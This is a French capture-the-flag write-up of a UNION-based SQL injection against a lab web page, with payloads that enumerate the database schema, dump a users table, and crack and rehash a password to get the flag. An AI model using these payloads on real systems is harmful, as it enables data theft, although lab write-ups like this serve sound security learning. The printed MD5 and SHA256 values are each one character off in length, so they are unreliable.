Flag 8 - SQL Injection UNION

On se rend à la page :
http://192.168.1.47/?page=member

Un champ "Search member by ID" permet de pouvoir tester des payloads.

J'ai testé :

1 OR 1=1


Le serveur nous a envoyé plusieurs utilisateurs

<img width="1202" height="763" alt="image" src="https://github.com/user-attachments/assets/6a3943a4-c227-4f75-b551-ad30cc87c4df" />


On sait que la requête est vulnérable à l'injection SQL.

On cherche les nom de colonnes :

1 UNION SELECT NULL,NULL--


<img width="1047" height="503" alt="image" src="https://github.com/user-attachments/assets/55ea3473-5661-4fac-8b66-9871bfd8b2d2" />


On sait que la requête possède deux colonnes.


On cherche le nombre de table de la base :

1 OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables--

On trouve : 

- users
- list_images
- guestbook
- vote_dbs

On se focalise sur la table users, plus interessante.


On cherche le nombre de colonne de la table users :
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns--

On trouve :

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign
- etc...

On cherche les données de la table users :

1 OR 1=1 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users--

On trouve un hash :

<img width="1514" height="896" alt="image" src="https://github.com/user-attachments/assets/b0119ce0-c1d5-4841-8794-20715a7f895f" />


MD5 = 5ff9d0165b4f92b14994e5c685cdce028


On le déchiffre : 

<img width="1424" height="659" alt="image" src="https://github.com/user-attachments/assets/7d3fd7c4-91c4-4033-97ec-637640de33a8" />


Enfin pour hasher "fortytwo" en SHA256, on utilise :

echo -n "fortytwo" | sha256sum


Ce qui nous donne le flag :

10a16d834f9b1e4068b25c4c46fe284e99e44dceaf08098fc83925ba6311ff5



<img width="498" height="60" alt="image" src="https://github.com/user-attachments/assets/1eb5916b-35df-442c-81bf-1b025b453bf1" />



